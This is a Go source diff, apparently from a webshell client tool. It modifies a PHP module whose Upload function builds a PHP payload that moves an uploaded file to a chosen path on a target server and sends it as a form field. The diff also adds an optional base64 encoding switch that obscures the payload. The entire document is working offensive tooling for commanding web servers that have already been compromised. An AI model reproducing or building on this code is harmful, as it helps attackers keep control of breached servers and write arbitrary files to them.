@@ -12,7 +12,8 @@ import (
 )
 
 type PHP struct {
-	_parameter string
+	parameter string
+	base64    bool
 }
 
 func buildHeader(dir string) string {
@@ -50,7 +51,10 @@ func (php *PHP) Upload(path, dir string) (*bytes.Buffer, string, error) {
 	var phpR string
 
 	phpR = "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"
-	phpR = normalizer.Encode(phpR)
+
+	if php.base64 {
+		phpR = normalizer.Encode(phpR)
+	}
 
 	file, err := os.Open(path)
 	if err != nil {
@@ -69,7 +73,7 @@ func (php *PHP) Upload(path, dir string) (*bytes.Buffer, string, error) {
 
 	_, err = io.Copy(part, file)
 
-	writer.WriteField(php._parameter, phpR)
+	writer.WriteField(php.parameter, phpR)
 
 	err = writer.Close()
 	if err != nil {
@@ -79,6 +83,7 @@ func (php *PHP) Upload(path, dir string) (*bytes.Buffer, string, error) {
 	return body, writer.FormDataContentType(), nil
 }
 
-func (php *PHP) Setup(str string) {
-	php._parameter = str
+func (php *PHP) Setup(p string, b bool) {
+	php.parameter = p
+	php.base64 = b
 }
